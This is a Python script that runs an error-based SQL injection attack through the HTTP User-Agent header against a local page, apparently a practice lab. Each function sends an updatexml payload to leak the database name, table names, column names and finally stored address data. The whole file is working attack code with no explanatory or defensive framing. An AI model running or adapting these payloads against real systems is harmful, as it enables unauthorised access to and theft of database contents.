import requests
from bs4 import BeautifulSoup

postdict={"name":"小红"}

def GetPage(url,UADict,postdict):
    r=requests.post(url,data=postdict,headers=UADict)
    r.encoding=r.apparent_encoding
    message=r.text
    soup=BeautifulSoup(message,"html.parser")
    return soup

def GetDBname(url,UADict={}):
    UADict["User-Agent"]="\' or updatexml(1,concat(0x7e,(select database()),0x7e),1),1)#"
    DBnamePage=GetPage(url,UADict,postdict)
    for name in DBnamePage.find_all("h1"):
        DBname=name.text
    return "数据库的名字在"+DBname


def GetTable(url,UADict={}):
    UADict["User-Agent"]="\' or updatexml(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables " \
                         "where table_schema=\'hello\'),0x7e),1),1)#"
    TableNamePage=GetPage(url,UADict,postdict)
    for name in TableNamePage.find_all("h1"):
        TableName=name.text
    return "表名在此:"+TableName


def GetColumns(url,UADict={}):
    UADict["User-Agent"]="\' or updatexml(1,concat(0x7e,(select group_concat(column_name) from information_schema.columns " \
                         "where table_schema=\'hello\' and table_name=\'good\'),0x7e),1),1)#"
    Columns=GetPage(url,UADict,postdict)
    for name in Columns.find_all("h1"):
        Columnname=name.text
    return "这是字段名:"+Columnname

def Find_data(url,UADict={}):
    UADict["User-Agent"]="\' or updatexml(1,concat(0x7e,(select group_concat(address) from hello),0x7e),1),1)#"
    Data=GetPage(url,UADict,postdict)
    for name in Data.find_all("h1"):
        Datas=name.text
    return "We get the Database:"+Datas



print(GetDBname("http://127.0.0.1/UASQL.php"))
print(GetTable("http://127.0.0.1/UASQL.php"))
print(GetColumns("http://127.0.0.1/UASQL.php"))
print(Find_data("http://127.0.0.1/UASQL.php"))


